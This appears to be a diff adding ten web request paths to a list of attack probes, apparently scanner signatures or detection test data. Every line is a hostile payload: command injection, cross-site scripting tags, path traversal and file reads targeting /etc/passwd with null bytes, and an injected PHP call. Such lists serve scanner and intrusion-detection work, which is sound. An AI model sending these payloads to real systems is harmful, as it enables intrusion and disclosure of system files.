@@ -1,0 +1,10 @@
+/top.php?stuff='uname >q36497765 #
+/h21y8w52.nsf?<script>cross_site_scripting.nasl</script>
+/ca000001.pl?action=showcart&hop=\"><script>alert('vulnerable')</script>&path=acatalog/
+/scripts/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name= ;id;
+/javascript/mta.exe
+/examples/jsp/colors/kernel/loadkernel.php?installpath=/etc/passwd\x00
+/examples/jsp/cal/feedsplitter.php?format=../../../../../../../../../../etc/passwd\x00&debug=1
+/phpwebfilemgr/index.php?f=../../../../../../../../../etc/passwd
+/cgi-bin/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=</option></select><?phpinfo();?>
+/examples/jsp/cal/search.php?allwords=<br><script>foo</script>&cid=0&title=1&desc=1
